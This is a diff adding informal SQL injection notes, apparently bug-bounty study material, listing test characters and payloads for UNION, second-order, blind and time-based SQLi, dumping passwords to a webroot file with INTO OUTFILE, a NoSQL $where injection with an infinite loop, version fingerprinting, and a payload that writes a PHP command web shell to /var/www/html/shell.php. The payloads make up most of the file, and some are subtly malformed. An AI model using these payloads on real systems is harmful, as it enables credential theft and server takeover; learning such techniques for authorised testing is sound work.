@@ -1,0 +1,89 @@
+One of the most devastating server side bug, nowadays you won't it find using a simple 'OR 1=1-- payload 
+but there are some tricks to still find it.
+
+Before understanding SQLi you should know the basics of sql
+heres a quick SQL refresher..
+https://youtu.be/xiUTqnI6xk8
+
+Test by inecting strings like
+`, -, /, ', :, ; 
+
+Extract the user ID
+SELECT Id FROM Users
+WHERE Username='you' AND Password='password123';
+
+Altering database records
+UPDATE Users
+SET Password='password12345'
+WHERE Id = 2;
+
+Second order sqli
+username="john_Cena' UNION SELECT Username, Password FROM Users;--
+"&password=password123
+
+Classic SQLi (rare nowadays)
+SELECT Title, Body FROM Emails
+WHERE Username='kane' AND AccessKey='ZB6w0YLjzvAVmp6zvr'
+UNION SELECT Username, Password FROM Users;-- 
+
+Blind SQLi
+
+You might use a webserver to get your responses too.
+
+SELECT * FROM PremiumUsers WHERE Id='2'
+UNION SELECT Id FROM Users
+WHERE Username = 'admin'
+and 1 SUBSTR(Password, 1, 1) = 'a';--
+If you see some differentiation in the responses try to exploit it by automation like SQLmap
+
+Time based 
+
+sleep(5)
+2' UNION SELECT
+IF(SUBSTR(Password, 1, 1) = 'a', SLEEP(10), 0)
+Password FROM Users
+WHERE Username = 'admin';
+
+Exfiltrate data using sqli
+
+SELECT Password FROM Users WHERE Username='admin'
+INTO OUTFILE '/var/www/html/output.txt'
+now fire up the file in the url and view
+
+INSERT INTO ActiveUsers
+VALUES ('2', (SELECT Password FROM Users
+WHERE Username='admin'
+INTO OUTFILE '/var/www/html/output.txt'));-- ', 'vickie');
+
+NOsql injection (mongo db)
+Users.find({username: 'vickie', password: 'password123'});
+Users.find({username: $username, password: $password});
+Users.find( { $where: function() {
+return (this.username == 'ohyea'; while(true){};) } } );
+Users.find( { $where: function() {
+return (this.username == $user_input) } } );
+
+Automate using NOSQLmap
+https://github.com/codingo/NoSQLMap/
+
+Learning abbt teh database
+SELECT Title, Body FROM Emails
+WHERE Username='vickie'
+UNION SELECT 1, @@version;--
+
+Some common commands for querying the version type are @@version
+for Microsoft SQL Server and MySQL, version() for PostgreSQL, and
+v$version for Oracle. The 1 in the UNION SELECT 1, DATABASE_VERSION_QUERY;-- line
+is necessary, because for a UNION statement to work, the two SELECT statements
+it connects need to have the same number of columns
+
+Time bases database version - SELECT * FROM PremiumUsers WHERE Id='2'
+UNION SELECT IF(SUBSTR(@@version, 1, 1) = '1', SLEEP(10), 0); --
+
+Gaining a web shell
+SELECT Password FROM Users WHERE Username='abc'
+UNION SELECT "<? system($_REQUEST['cmd']); ?>"
+INTO OUTFILE "/var/www/html/shell.php"
+
+
+
